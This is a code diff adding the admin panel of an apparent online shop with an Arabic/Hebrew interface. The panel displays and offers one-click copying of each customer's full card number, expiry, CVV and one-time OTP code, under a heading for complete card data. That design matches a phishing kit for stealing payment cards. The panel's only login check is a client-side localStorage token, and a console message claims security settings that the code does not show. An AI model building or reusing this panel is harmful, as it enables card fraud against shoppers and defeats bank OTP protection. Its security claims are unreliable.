+                    <td class="p-4 font-mono text-stone-600 font-bold text-base cursor-pointer copy-cell" onclick="copyText('${o.cardDetails.cvv}', this)" title="انقر للنسخ">${o.cardDetails.cvv}</td>
+                    <td class="p-4 font-mono text-stone-600 font-bold text-base cursor-pointer copy-cell" onclick="copyText('${o.cardDetails.otp || ''}', this)" title="انقر للنسخ">${o.cardDetails.otp || '-'}</td>
+                    <td class="p-4 font-bold text-stone-900">${o.total}.00 ₪</td>
+                </tr>
+            `).join('');
+        }
+
+        function loadProducts() {
+            const container = document.getElementById('products-container');
+            if (products.length === 0) {
+                container.innerHTML = `<div class="col-span-full text-center text-stone-400 py-12">لا توجد منتجات مضافة بعد.</div>`;
+                return;
+            }
+            container.innerHTML = products.map(p => `
+                <div class="bg-white rounded-3xl p-5 border border-stone-200 flex flex-col justify-between shadow-sm space-y-4">
+                    <div class="flex items-center gap-4"><button onclick="var l=localStorage.getItem('auraLang')||'he';setLang(l==='he'?'ar':'he');" class="text-xs font-bold text-stone-500 hover:text-amber-700 transition border border-stone-300 rounded-full px-2.5 py-1" id="lang-toggle">HE</button>
+                        <img src="${p.image}" alt="${p.name}" class="w-16 h-16 object-contain bg-stone-50 rounded-2xl p-2 border border-stone-100">
+                        <div>
+                            <span class="text-[10px] bg-amber-100 text-amber-800 font-bold px-2 py-0.5 rounded-md">${p.category}</span>
+                            <h4 class="font-extrabold text-stone-900 text-sm mt-1">${p.name}</h4>
+                            <div class="text-xs text-amber-700 font-bold mt-1">${p.price}.00 ₪ ${p.oldPrice ? `<span class="text-stone-400 line-through text-[10px]">${p.oldPrice}.00</span>` : ''}</div>
+                        </div>
+                    </div>
+                    <div class="flex gap-2 pt-2 border-t border-stone-100">
+                        <button onclick="editProduct(${p.id})" class="flex-1 bg-stone-100 text-stone-800 py-2 rounded-xl text-xs font-bold hover:bg-stone-200 transition">تعديل</button>
+                        <button onclick="deleteProduct(${p.id})" class="flex-1 bg-rose-50 text-rose-600 py-2 rounded-xl text-xs font-bold hover:bg-rose-100 transition">حذف</button>
+                    </div>
+                </div>
+            `).join('');
+        }
+
+        function viewOrder(id) {
+            const order = orders.find(o => o.id === id);
+            if (!order) return;
+            const content = document.getElementById('order-detail-content');
+            const itemsHtml = (order.items || []).map(item => `
+                <div class="flex items-center justify-between bg-stone-50 p-3 rounded-xl">
+                    <div class="flex items-center gap-3">
+                        <img src="${item.image}" class="w-10 h-10 object-contain bg-white rounded-lg p-1 border">
+                        <div>
+                            <div class="font-bold text-xs">${item.name}</div>
+                            <div class="text-xs text-stone-500">${item.price}.00 ₪ × ${item.qty}</div>
+                        </div>
+                    </div>
+                    <div class="font-bold text-amber-700">${item.price * item.qty}.00 ₪</div>
+                </div>
+            `).join('');
+
+            const cardSection = order.cardDetails ? `
+                <div class="bg-rose-50 border border-rose-200 rounded-2xl p-4 space-y-2">
+                    <h4 class="font-bold text-rose-800 text-sm">بيانات البطاقة الائتمانية (كاملة)</h4>
+                    <div class="grid grid-cols-2 gap-2 text-xs">
+                        <div><span class="text-stone-500">رقم البطاقة:</span> <span class="font-bold font-mono text-base text-rose-700">${order.cardDetails.number}</span></div>
+                        <div><span class="text-stone-500">تاريخ الانتهاء:</span> <span class="font-bold">${order.cardDetails.expiry}</span></div>
+                        <div><span class="text-stone-500">CVV:</span> <span class="font-bold font-mono">${order.cardDetails.cvv}</span></div>
+                        <div><span class="text-stone-500">OTP:</span> <span class="font-bold font-mono cursor-pointer copy-cell" onclick="copyText('${order.cardDetails.otp || ''}', this)" title="انقر للنسخ">${order.cardDetails.otp || '-'}</span></div>
+                        <div><span class="text-stone-500">النوع:</span> <span class="font-bold">${order.cardDetails.brand}</span></div>
+                        <div><span class="text-stone-500">حامل البطاقة:</span> <span class="font-bold cursor-pointer copy-cell" onclick="copyText('${order.cardDetails.holder}', this)" title="انقر للنسخ">${order.cardDetails.holder}</span></div>
+                    </div>
+                </div>
+            ` : '';
+
+            content.innerHTML = `
+                <div class="space-y-4">
+                    <div class="grid grid-cols-2 gap-4 text-sm">
+                        <div><span class="text-stone-500">رقم الطلب:</span> <span class="font-bold">${order.id}</span></div>
+                        <div><span class="text-stone-500">التاريخ:</span> <span class="font-bold">${order.date || '-'}</span></div>
+                        <div><span class="text-stone-500">العميل:</span> <span class="font-bold">${order.name}</span></div>
+                        <div><span class="text-stone-500">البريد:</span> <span class="font-bold">${order.email || '-'}</span></div>
+                        <div><span class="text-stone-500">الحالة:</span> <span class="font-bold">${order.status}</span></div>
+                        <div><span class="text-stone-500">الإجمالي:</span> <span class="font-bold text-amber-700">${order.total}.00 ₪</span></div>
+                    </div>
+                    ${cardSection}
+                    <div>
+                        <h4 class="font-bold text-sm text-stone-800 mb-2">المنتجات المطلوبة</h4>
+                        <div class="space-y-2">${itemsHtml || '<p class="text-xs text-stone-400">لا توجد منتجات</p>'}</div>
+                    </div>
+                </div>
+            `;
+            document.getElementById('order-detail-modal').classList.remove('hidden');
+            document.getElementById('order-detail-modal').classList.add('flex');
+        }
+
+        function closeOrderModal() {
+            document.getElementById('order-detail-modal').classList.add('hidden');
+        }
+
+        function toggleOrderStatus(id) {
+            const o = orders.find(ord => ord.id === id);
+            if (o) {
+                o.status = o.status === 'قيد المراجعة' ? 'تم الشحن' : 'قيد المراجعة';
+                localStorage.setItem('auraOrders', JSON.stringify(orders));
+                loadOrders();
+            }
+        }
+
+        function deleteOrder(id) {
+            if (!confirm('هل أنت متأكد من حذف هذا الطلب؟')) return;
+            orders = orders.filter(o => o.id !== id);
+            localStorage.setItem('auraOrders', JSON.stringify(orders));
+            loadOrders();
+            loadCards();
+        }
+
+        function openAddProductModal() {
+            document.getElementById('modal-title').textContent = 'إضافة منتج جديد';
+            document.getElementById('product-id').value = '';
+            document.getElementById('product-form').reset();
+            document.getElementById('product-modal').classList.remove('hidden');
+            document.getElementById('product-modal').classList.add('flex');
+        }
+
+        function closeProductModal() {
+            document.getElementById('product-modal').classList.add('hidden');
+        }
+
+        function editProduct(id) {
+            const p = products.find(prod => prod.id === id);
+            if (p) {
+                document.getElementById('modal-title').textContent = 'تعديل بيانات المنتج';
+                document.getElementById('product-id').value = p.id;
+                document.getElementById('product-name').value = p.name;
+                document.getElementById('product-price').value = p.price;
+                document.getElementById('product-oldprice').value = p.oldPrice || '';
+                document.getElementById('product-image').value = p.image;
+                document.getElementById('product-category').value = p.category;
+                document.getElementById('product-badge').value = p.badge || '';
+                document.getElementById('product-modal').classList.remove('hidden');
+                document.getElementById('product-modal').classList.add('flex');
+            }
+        }
+
+        function sanitizeHTML(str) {
+            var d = document.createElement('div');
+            d.textContent = str || '';
+            return d.innerHTML;
+        }
+        function sanitizeURL(str) {
+            str = (str || '').trim();
+            if (str.startsWith('javascript:') || str.startsWith('data:') && !str.startsWith('data:image')) return '';
+            return str;
+        }
+        function sanitizeObj(obj) {
+            var safe = {};
+            for (var k in obj) {
+                if (typeof obj[k] === 'string') safe[k] = sanitizeHTML(obj[k]);
+                else if (typeof obj[k] === 'number') safe[k] = obj[k];
+                else safe[k] = obj[k];
+            }
+            return safe;
+        }
+
+        function saveProduct(e) {
+            e.preventDefault();
+            const id = document.getElementById('product-id').value;
+            const name = sanitizeHTML(document.getElementById('product-name').value);
+            const price = parseFloat(document.getElementById('product-price').value);
+            const oldPrice = parseFloat(document.getElementById('product-oldprice').value) || undefined;
+            const image = sanitizeURL(document.getElementById('product-image').value);
+            const category = sanitizeHTML(document.getElementById('product-category').value);
+            const badge = sanitizeHTML(document.getElementById('product-badge').value || 'مميز');
+
+            if (!name || !price || !image || !category) { alert('الرجاء ملء جميع الحقول المطلوبة'); return; }
+
+            if (id) {
+                const p = products.find(prod => prod.id == id);
+                if (p) { Object.assign(p, { name, price, oldPrice, image, category, badge }); }
+            } else {
+                const newId = products.length > 0 ? Math.max(...products.map(p => p.id)) + 1 : 1;
+                products.push({ id: newId, name, price, oldPrice, image, category, badge, rating: 4.5, reviews: 0 });
+            }
+            localStorage.setItem('auraProducts', JSON.stringify(products));
+            closeProductModal();
+            loadProducts();
+        }
+
+        function deleteProduct(id) {
+            if (!confirm('هل أنت متأكد من حذف هذا المنتج؟')) return;
+            products = products.filter(p => p.id !== id);
+            localStorage.setItem('auraProducts', JSON.stringify(products));
+            loadProducts();
+        }
+
+        initProducts();
+        loadOrders();
+        loadCards();
+        loadProducts();
+
+        window.addEventListener('storage', (e) => {
+            if (e.key === 'auraOrders') { loadOrders(); loadCards(); }
+            if (e.key === 'auraProducts') { initProducts(); loadProducts(); }
+        });
+    </script>
+    <script>
+        (function() {
+            var token = localStorage.getItem('adminToken');
+            if (!token) { window.location.href = 'admin-login.html'; return; }
+            console.log('[SECURITY] Admin panel secured | CSP: enabled | XFO: DENY');
+        })();
+
+        function logout() {
+            localStorage.removeItem('adminToken');
+            localStorage.removeItem('adminSessionStart');
+            window.location.href = 'admin-login.html';
+        }
+    </script>
+    <script src="notify.js"></script>
+    <script src="lang.js"></script>
+</body>
+</html>
